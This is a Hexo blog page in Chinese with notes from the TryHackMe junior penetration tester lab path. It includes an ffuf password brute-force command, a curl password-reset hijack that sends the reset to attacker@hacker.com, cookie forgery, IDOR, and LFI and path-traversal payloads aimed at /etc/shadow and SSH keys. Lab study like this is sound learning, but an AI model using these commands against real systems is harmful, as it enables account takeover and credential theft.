@@ -1,0 +1,906 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 6.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
+  </script>
+
+  <meta name="description" content="该学习路径涵盖了使您能够成功成为初级渗透测试员的核心技术技能。完成此路径后，您将具备对 Web 应用程序和企业基础架构执行安全评估所需的实用技能。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Jr Penetration Tester">
+<meta property="og:url" content="http://example.com/2022/05/22/Jr-Penetration-Tester/index.html">
+<meta property="og:site_name" content="SugarCrash!">
+<meta property="og:description" content="该学习路径涵盖了使您能够成功成为初级渗透测试员的核心技术技能。完成此路径后，您将具备对 Web 应用程序和企业基础架构执行安全评估所需的实用技能。">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/pImvwCSXKAiDBZq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/jpzicOhTNx1DVLU.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/yXJdqG6CoWKA7Fg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/5uWKIzPbkJ9y26O.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/5H6GgoCkTFEucVw.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/YIgWyn13XlHxMGT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/A7RwpJsy1XHdfPY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/5WuIcyTFgVXUHsq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/1GvsXQhNZMyadPk.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/Qu4D1CtgvB6dF5s.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/2WHUTEjGZvSlCLh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/VnK81CfX6dxAhL5.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/MweXxR6PsdAzv9H.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/BgAvMIxUYdO4jKe.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/rg8PYhI5NEnRsiJ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/H5sfraTIYgDCFMN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/RqwKe8ncboM2IEh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/a4BCGF79ZHdoSIT.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/itzqAbWamsvd8U9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/WudpG4v179FECVK.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/hbq3MtUNLkYuEx7.png">
+<meta property="og:image" content="https://gitee.com/mr-liu-i/mypicture/raw/master/path/202205151520220.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/kg4ArzvN5ElJZDj.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/reIsndKa2N3gbRH.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/ksM7VhcR3pzZGQn.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/BXIWyAOm9DbL4au.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/r95kbTYs8P6A7uQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/zoTHE9yd5UtWNqQ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/MOrK8YLk9qNFwRy.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/bLgtx8Fj1wGhWlp.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/FNezQ71arRS6WoD.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/fYegmZlxk8a3c6h.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/RMJ93oOqLF2ev1Y.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/95BtT2vxw6rXaRf.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/RMJ93oOqLF2ev1Y.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/TYZFE7cjs5CmoJV.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/KV8L7cXI6ESqBxt.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/dJQztwCHFgXE5eZ.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/OQuMZ5Xh4PRy3Cn.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/Xnpwv1cRzMlS6LY.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/a8ZGSUFeQ24YpE9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/piZaGKwtobqs7WI.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/a8ZGSUFeQ24YpE9.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/piZaGKwtobqs7WI.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/yLZ5Yp4UGM8JOTg.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/JoezwcamEAtZW9L.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/8J23wb7fKUQMnHq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/gq871wnLQkaJMDN.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/yVHwj4Tv2BY8gxq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/pKlxBDm1QV8Nsvh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/tN5nRugP6foG3Sq.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/wVaErNlxn5qckKS.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/xD4ptozHAN5VBeh.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/235lks1KJOScqW7.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/VT32QngErKPDHOo.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/yBmale1RbiWnt6s.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/mIvZVpCFuX5LDy8.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/somCEOyDhMtvJ5G.png">
+<meta property="og:image" content="https://s2.loli.net/2022/05/18/Epx28m963WrXNTC.png">
+<meta property="article:published_time" content="2022-05-22T02:28:16.000Z">
+<meta property="article:modified_time" content="2022-05-29T03:09:40.771Z">
+<meta property="article:author" content="Lu1i丶">
+<meta property="article:tag" content="Web">
+<meta property="article:tag" content="基础向">
+<meta property="article:tag" content="Tryhackme">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://s2.loli.net/2022/05/18/pImvwCSXKAiDBZq.png">
+
+<link rel="canonical" href="http://example.com/2022/05/22/Jr-Penetration-Tester/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>Jr Penetration Tester | SugarCrash!</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">SugarCrash!</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+      <p class="site-subtitle" itemprop="description">记录学习，想找个师傅带带我</p>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/22/Jr-Penetration-Tester/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/1.PNG">
+      <meta itemprop="name" content="Lu1i丶">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="SugarCrash!">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          Jr Penetration Tester
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2022-05-22 10:28:16" itemprop="dateCreated datePublished" datetime="2022-05-22T10:28:16+08:00">2022-05-22</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2022-05-29 11:09:40" itemprop="dateModified" datetime="2022-05-29T11:09:40+08:00">2022-05-29</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Tryhackme/" itemprop="url" rel="index"><span itemprop="name">Tryhackme</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>该学习路径涵盖了使您能够成功成为初级渗透测试员的核心技术技能。完成此路径后，您将具备对 Web 应用程序和企业基础架构执行安全评估所需的实用技能。</p>
+<span id="more"></span>
+
+<p><img src="https://s2.loli.net/2022/05/18/pImvwCSXKAiDBZq.png" alt="202205181148059.png"></p>
+<h3 id="子域名枚举"><a href="#子域名枚举" class="headerlink" title="子域名枚举"></a>子域名枚举</h3><p>作用：扩大我们的攻击面，以尝试发现更多潜在的漏洞点<br>三种子域名枚举方法：</p>
+<ol>
+<li>Brute Force (暴力)</li>
+<li>OSINT(开源智能)</li>
+<li>虚拟主机<h4 id="OSINT-SLL-x2F-TLS证书"><a href="#OSINT-SLL-x2F-TLS证书" class="headerlink" title="OSINT-SLL&#x2F;TLS证书"></a>OSINT-SLL&#x2F;TLS证书</h4>当 CA（证书颁发机构）为域创建 SSL&#x2F;TLS（安全套接字层&#x2F;传输层安全）证书时，CA 会参与所谓的“证书透明度 (CT) 日志”。这些是为域名创建的每个 SSL&#x2F;TLS 证书的可公开访问的日志。证书透明度日志的目的是阻止恶意和意外制作的证书被使用。我们可以利用这项服务来发现属于某个域的子域。<blockquote>
+<p><a target="_blank" rel="noopener" href="http://crt.sh/">https://crt.sh</a><br><a target="_blank" rel="noopener" href="https://transparencyreport.google.com/https/certificates">https://transparencyreport.google.com/https/certificates</a><br><img src="https://s2.loli.net/2022/05/18/jpzicOhTNx1DVLU.png" alt="202205181148060.png"></p>
+</blockquote>
+<h4 id="OSINT-搜索引擎"><a href="#OSINT-搜索引擎" class="headerlink" title="OSINT-搜索引擎"></a>OSINT-搜索引擎</h4><p>搜索引擎包含数万亿个指向超过 10 亿个网站的链接，这可能是寻找新子域的绝佳资源。 在 Google 等网站上使用高级搜索方法，例如 site:filter，可以缩小搜索结果的范围。例如，“-site:<a target="_blank" rel="noopener" href="http://www.domain.com/">www.domain.com</a> site:*.domain.com”将仅包含指向域名 domain.com 的结果，但不包括指向 <a target="_blank" rel="noopener" href="http://www.domain.com/">www.domain.com</a> 的任何链接；因此，它只向我们显示属于 domain.com 的子域名。</p>
+</li>
+</ol>
+<p>方法：<br>site:<a target="_blank" rel="noopener" href="http://www.tryhackme.com/">www.tryhackme.com</a><br>site:*.tryhackme.com<br><img src="https://s2.loli.net/2022/05/18/yXJdqG6CoWKA7Fg.png" alt="202205181148061.png"></p>
+<h4 id="DNS暴力破解"><a href="#DNS暴力破解" class="headerlink" title="DNS暴力破解"></a>DNS暴力破解</h4><p>Bruteforce DNS（域名系统）枚举是从常用子域的预定义列表中尝试数十、数百、数千甚至数百万个不同的可能子域的方法。<br>由于此方法需要许多请求，因此我们使用工具将其自动化以加快处理速度。<br><img src="https://s2.loli.net/2022/05/18/5uWKIzPbkJ9y26O.png" alt="202205181148063.png"></p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36386435/article/details/104291599">https://blog.csdn.net/qq_36386435&#x2F;article&#x2F;details&#x2F;104291599</a></p>
+</blockquote>
+<h4 id="OSINT-Sublist3r"><a href="#OSINT-Sublist3r" class="headerlink" title="OSINT-Sublist3r"></a>OSINT-Sublist3r</h4><p>为了加快 OSINT 子域发现的过程，我们可以借助 <a target="_blank" rel="noopener" href="https://github.com/aboul3la/Sublist3r">Sublist3r</a>等工具自动执行上述方法，</p>
+<p>发现oneforall集成了这个工具 oneforall yyds<br><img src="https://s2.loli.net/2022/05/18/5H6GgoCkTFEucVw.png" alt="202205181148064.png"></p>
+<h4 id="虚拟主机"><a href="#虚拟主机" class="headerlink" title="虚拟主机"></a>虚拟主机</h4><p>某些子域并不总是托管在可公开访问的<a href="undefined">DNS</a></p>
+<p>结果中，例如 Web 应用程序的开发版本或管理门户。</p>
+<p>相反，DNS 记录可以保存在私有 DNS 服务器上，或者记录在开发人员机器上的 &#x2F;etc&#x2F;hosts 文件（或 Windows 用户的 c:\windows\system32\drivers\etc\hosts 文件）中，该文件将域名映射到IP 地址。 </p>
+<p>因为当客户端请求网站时，Web 服务器可以从一个服务器托管多个网站，所以服务器从 Host 标头中知道客户端想要哪个网站。我们可以通过对其进行更改并监视响应来查看我们是否发现了一个新网站来利用此主机标头。<br>FUFF工具</p>
+<blockquote>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/u010062917/article/details/120473487">https://blog.csdn.net/u010062917/article/details/120473487</a></p>
+</blockquote>
+<h3 id="身份验证绕过"><a href="#身份验证绕过" class="headerlink" title="身份验证绕过"></a>身份验证绕过</h3><p><img src="https://s2.loli.net/2022/05/18/YIgWyn13XlHxMGT.png" alt="202205181148065.png"></p>
+<p>在我们尝试用弱口令的时候，我们用admin，发现用户名存在，我们就可以用这个方法爆破一波用户名<br><img src="https://s2.loli.net/2022/05/18/A7RwpJsy1XHdfPY.png" alt="202205181148066.png"><br><img src="https://s2.loli.net/2022/05/18/5WuIcyTFgVXUHsq.png" alt="202205181148067.png"><br>出现4个用户名<br>admin<br>robert<br>simon<br>steve<br>把这4个用户名保存成一个叫usernames.txt文件<br>然后用下面这个爆破他的密码</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -w usernames.txt:W1,/usr/share/wordlists/seclists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d <span class="string">&quot;username=W1&amp;password=W2&quot;</span> -H <span class="string">&quot;Content-Type: application/x-www-form-urlencoded&quot;</span> -u http://10.10.238.105/customers/login -<span class="built_in">fc</span> 200</span><br></pre></td></tr></table></figure>
+<p><img src="https://s2.loli.net/2022/05/18/1GvsXQhNZMyadPk.png" alt="202205181148068.png"></p>
+<h3 id="逻辑缺陷"><a href="#逻辑缺陷" class="headerlink" title="逻辑缺陷"></a>逻辑缺陷</h3><p>什么是逻辑缺陷？<br>有时身份验证过程包含逻辑缺陷。逻辑缺陷是指应用程序的典型逻辑路径被黑客绕过、规避或操纵。网站的任何区域都可能存在逻辑缺陷，但我们将重点关注与此实例中的身份验证相关的示例<br><img src="https://s2.loli.net/2022/05/18/Qu4D1CtgvB6dF5s.png" alt="202205181148069.png"></p>
+<p>逻辑缺陷示例</p>
+<p>下面的模拟代码示例检查客户端访问的路径的开头是否以 &#x2F;admin 开头，如果是，则进一步检查客户端是否实际上是管理员。<br>如果页面不以 &#x2F;admin 开头，则该页面将显示给客户端。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>( url.<span class="title function_">substr</span>(<span class="number">0</span>,<span class="number">6</span>) === <span class="string">&#x27;/admin&#x27;</span>) &#123;</span><br><span class="line">    # <span class="title class_">Code</span> to check user is an admin</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    # <span class="title class_">View</span> <span class="title class_">Page</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为上面的PHP代码示例使用三个等号 (&#x3D;&#x3D;&#x3D;)，所以它在字符串上寻找完全匹配，包括相同的字母大小写。该代码存在逻辑缺陷，因为请求 &#x2F;adMin的未经身份验证的用户 将不会检查他们的权限并将页面显示给他们，完全绕过身份验证检查。</p>
+<p>下面这个案例就是，我们有了一个重置密码的一个邮箱，在其中我们要输入可用的邮箱和可用的用户名，然后他会把密码发到那个邮箱里面去。我们可以用curl工具在其中进行截断，把重置密码的邮箱发到自己的邮箱里面来。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://10.10.238.105/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">&#x27;http://10.10.238.105/customers/reset?email=robert%40acmeitsupport.thm&#x27;</span> -H <span class="string">&#x27;Content-Type: application/x-www-form-urlencoded&#x27;</span> -d <span class="string">&#x27;username=robert&amp;email=attacker@hacker.com&#x27;</span></span><br></pre></td></tr></table></figure>
+<h4 id="cookie篡改"><a href="#cookie篡改" class="headerlink" title="cookie篡改"></a>cookie篡改</h4><p>有些cookie是纯文本的形式保存的例如<br><img src="https://s2.loli.net/2022/05/18/2WHUTEjGZvSlCLh.png" alt="202205181148070.png"></p>
+<p>我们可以用更改其中的请求达到伪造的目的</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H <span class="string">&quot;Cookie: logged_in=true; admin=false&quot;</span> http://10.10.238.105/cookie-test</span><br></pre></td></tr></table></figure>
+<p>但是有些cookie可能是md5，sha256，sha512，sha1这些算法，这些有的可以通过网站列举找到。<br><img src="https://s2.loli.net/2022/05/18/VnK81CfX6dxAhL5.png" alt="202205181148071.png"></p>
+<h4 id="IDOR-越权漏洞"><a href="#IDOR-越权漏洞" class="headerlink" title="IDOR(越权漏洞)"></a>IDOR(越权漏洞)</h4><p>IDOR 代表不安全的直接对象引用，是一种访问控制漏洞。</p>
+<p>当 Web 服务器接收用户提供的输入以检索对象（文件、数据、文档）时，可能会发生这种类型的漏洞，对输入数据过于信任，并且未在服务器端验证以确认请求的对象属于请求它的用户。</p>
+<p>选一个我们感觉存在越权漏洞的，我选的订单确认<br><img src="https://s2.loli.net/2022/05/18/MweXxR6PsdAzv9H.png" alt="202205181148073.png"><br><img src="https://s2.loli.net/2022/05/18/BgAvMIxUYdO4jKe.png" alt="202205181148072.png"><br>网站中常用base64<br><img src="https://s2.loli.net/2022/05/18/rg8PYhI5NEnRsiJ.png" alt="202205181148074.png"><br><img src="https://s2.loli.net/2022/05/18/H5sfraTIYgDCFMN.png" alt="202205181148076.png"><br><img src="https://s2.loli.net/2022/05/18/RqwKe8ncboM2IEh.png" alt="202205181148075.png"><br>可以改id查看信息</p>
+<h3 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h3><p>类型</p>
+<ol>
+<li>文件包含 (LFI)</li>
+<li>远程文件包含 (RFI) </li>
+<li>目录遍历<br><img src="https://s2.loli.net/2022/05/18/a4BCGF79ZHdoSIT.png" alt="202205181148077.png"><br><img src="https://s2.loli.net/2022/05/18/itzqAbWamsvd8U9.png" alt="202205181148078.png"><h4 id="目录遍历-路径遍历"><a href="#目录遍历-路径遍历" class="headerlink" title="目录遍历(路径遍历)"></a>目录遍历(路径遍历)</h4>Web 安全漏洞允许攻击者读取操作系统资源，例如运行应用程序的服务器上的本地文件。攻击者通过操纵和滥用 Web 应用程序的 URL 来利用此漏洞来定位和访问存储在应用程序根目录之外的文件或目录。</li>
+</ol>
+<p>当用户的输入被传递给PHP中的 &#x3D;&#x3D;file_get_contents&#x3D;&#x3D; 等函数时，就会发生路径 遍历漏洞。需要注意的是，该函数不是漏洞的主要贡献者。通常糟糕的输入验证或过滤是漏洞的原因。 在PHP中，您可以使用 &#x3D;&#x3D;file_get_contents&#x3D;&#x3D; 来读取文件的内容。<br>就是通过..&#x2F;上一级目录多加几个到根目录然后读取一些特有文件</p>
+<p>在linux中一般读取&#x2F;etc&#x2F;passwd  &#x2F;etc&#x2F;shadow<br>在windos中&#x2F;boot.ini &#x2F;windows&#x2F;win.ini</p>
+<table>
+<thead>
+<tr>
+<th>文件</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&#x2F;etc&#x2F;issue</td>
+<td>包含要在登录提示之前打印的消息或系统标识。</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;profile</td>
+<td>控制系统范围的默认变量，例如 导出变量、文件创建掩码 (umask)、终端类型、邮件消息以指示新邮件何时到达</td>
+</tr>
+<tr>
+<td>&#x2F;proc&#x2F;version</td>
+<td>指定Linux内核的版本</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;passwd</td>
+<td>拥有所有有权访问系统的注册用户</td>
+</tr>
+<tr>
+<td>&#x2F;etc&#x2F;shadow</td>
+<td>包含有关系统用户密码的信息</td>
+</tr>
+<tr>
+<td>&#x2F;root&#x2F;.bash_history</td>
+<td>包含root用户的历史命令</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;dmessage</td>
+<td>包含全局系统消息，包括系统启动期间记录的消息</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;mail&#x2F;root</td>
+<td>根用户的所有电子邮件</td>
+</tr>
+<tr>
+<td>&#x2F;root&#x2F;.ssh&#x2F;id_rsa</td>
+<td>服务器上 root 或任何已知有效用户的私有 SSH 密钥</td>
+</tr>
+<tr>
+<td>&#x2F;var&#x2F;log&#x2F;apache2&#x2F;access.log</td>
+<td>Apache  webserver的访问请求</td>
+</tr>
+<tr>
+<td>C:\boot.ini</td>
+<td>包含带有 BIOS 固件的计算机的启动选项</td>
+</tr>
+</tbody></table>
+<h4 id="本地文件包含-LFI"><a href="#本地文件包含-LFI" class="headerlink" title="本地文件包含(LFI)"></a>本地文件包含(LFI)</h4><p>针对 Web 应用程序的 LFI 攻击通常是由于开发人员缺乏安全意识。在PHP中，使用&#x3D;&#x3D;include&#x3D;&#x3D;、&#x3D;&#x3D;require&#x3D;&#x3D;<br>、&#x3D;&#x3D;include_once&#x3D;&#x3D;和&#x3D;&#x3D;require_once&#x3D;&#x3D;等函数通常会导致 Web 应用程序易受攻击。在这个房间里，我们将选择PHP，但值得注意的是，在使用其他语言（如 ASP、JSP 甚至在 Node.js 应用程序中）时也会出现 LFI 漏洞。LFI 漏洞利用遵循与路径遍历相同的概念。</p>
+<h4 id="LFI绕过"><a href="#LFI绕过" class="headerlink" title="LFI绕过"></a>LFI绕过</h4><p><code>Warning: include(languages/THM.php): failed to open stream: No such file or directory in /var/www/html/THM-4/index.php on line 12</code><br>输入无效的包含文件会报这样的错<br>一条错误消息会显示包含函数的样子：  &#x3D;&#x3D;include(languages&#x2F;THM.php);&#x3D;&#x3D; <br>错误消息还披露了有关完整 Web 应用程序目录路径的另一条重要信息，即 &#x3D;&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;THM-4&#x2F;&#x3D;&#x3D;</p>
+<p>使用4个..&#x2F;是因为这个前面有4阶目录<br><img src="https://s2.loli.net/2022/05/18/WudpG4v179FECVK.png" alt="202205181148079.png"><br>这里发现includes自动给&#x2F;etc&#x2F;passwd带了一个.php<br>使用00截断(%00)在url上面访问&#x2F;etc&#x2F;passwd不用表单提交<br>成功绕过<br><img src="https://s2.loli.net/2022/05/18/hbq3MtUNLkYuEx7.png" alt="202205181148080.png"></p>
+<blockquote>
+<p>注意:%00技巧已修复，不适用于PHP 5.3.4及更高版本。<br><img src="https://gitee.com/mr-liu-i/mypicture/raw/master/path/202205151520220.png"></p>
+</blockquote>
+<p>输入..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd发现报错，并且报错里面没有发现我们输入的..&#x2F;说明把..&#x2F;给过滤了<br>绕过：双写<br><img src="https://s2.loli.net/2022/05/18/kg4ArzvN5ElJZDj.png" alt="202205181148082.png"><br>如果 Web 应用程序要求提供必须包含目录的输入，</p>
+<p>例如：  <a target="_blank" rel="noopener" href="http://webapp.thm/index.php?lang=languages/EN.php">http://webapp.thm/index.php?lang=languages/EN.php</a>  ，<br>那么，为了利用它，我们需要包含有效载荷中的目录，如下所示：<br>&#x3D;&#x3D;?lang&#x3D;languages&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd&#x3D;&#x3D; <br>把目录给带上，就行了<br><img src="https://s2.loli.net/2022/05/18/reIsndKa2N3gbRH.png" alt="202205181148083.png"></p>
+<h4 id="远程文件包含-RFI"><a href="#远程文件包含-RFI" class="headerlink" title="远程文件包含(RFI)"></a>远程文件包含(RFI)</h4><p>远程文件包含 (RFI) 是一种将远程文件包含到易受攻击的应用程序中的技术。与 LFI 一样，RFI 发生在不正确地清理用户输入时，允许攻击者将外部 URL 注入到包含函数中。RFI 的一项要求是&#x3D;&#x3D;allow_url_fopen&#x3D;&#x3D;选项需要打开。<br>后果：</p>
+<ul>
+<li>敏感信息披露</li>
+<li>跨站脚本 (XSS)</li>
+<li>拒绝服务 ( DoS )</li>
+</ul>
+<p>修复：</p>
+<ul>
+<li>使用最新版本更新系统和服务，包括 Web 应用程序框架。</li>
